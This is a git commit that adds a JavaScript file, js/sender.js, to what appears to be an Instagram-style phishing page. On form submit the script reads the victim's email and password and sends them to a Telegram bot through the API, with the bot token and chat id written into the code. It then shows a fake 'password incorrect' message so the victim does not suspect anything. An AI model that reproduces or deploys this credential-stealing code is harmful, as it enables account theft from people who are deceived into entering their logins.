1287836b2e586e307cb6ef639cf5da3eeb42c5e3
dezignsensei <145669245+dezignsensei@users.noreply.github.com>
2023-10-14 19:37:38 +0100

    Add files via upload

---
+++ js/sender.js
@@ -0,0 +1,22 @@
+const form = document.querySelector("#form")
+
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    var identity = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+
+    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
+
+    var token = "6489956516:AAHubSs4x5DQnkdyQWe5Deny8vu4tU17RSo";
+    var chat_id = -4031644070
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
+
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
